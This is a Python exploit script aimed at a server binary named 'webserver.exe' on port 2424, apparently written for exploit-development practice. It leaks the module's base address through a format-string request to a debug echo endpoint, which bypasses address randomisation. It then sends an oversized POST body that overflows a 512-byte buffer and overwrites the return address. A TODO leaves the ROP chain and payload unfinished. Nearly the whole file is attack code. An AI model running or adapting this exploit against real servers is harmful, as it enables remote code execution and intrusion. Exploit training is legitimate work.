#!/usr/bin/python
import socket
import sys
from struct import pack

try:
        server = sys.argv[1]
        port = 2424
        bufferSize = 512

        print("Leaking webserver.exe module address...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(b"GET /debug/echo/%x.%x HTTP/1.1\r\n\r\n")

        response = b""
        while True:
            got = s.recv(128)
            if (len(got) == 0):
                break
            response += got

        responseAsString = response.decode('utf-8')
        webserverExe = int(responseAsString.split('.')[-1], 16) - 0x4cdd0
        print(f"webserver.exe: {hex(webserverExe)}")

        payload = b"A" * bufferSize
        payload += b"BBBB"

        # TODO: replace BBBB with ROP chain & payload

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(b"POST / HTTP/1.1\r\n")
        s.send(b"Content-Length: " + str(len(payload)).encode('utf-8') + b"\r\n")
        s.send(b"\r\n")
        s.send(payload)
        s.close()

        print("Payload sent!")

except socket.error:
        print("Could not connect!")
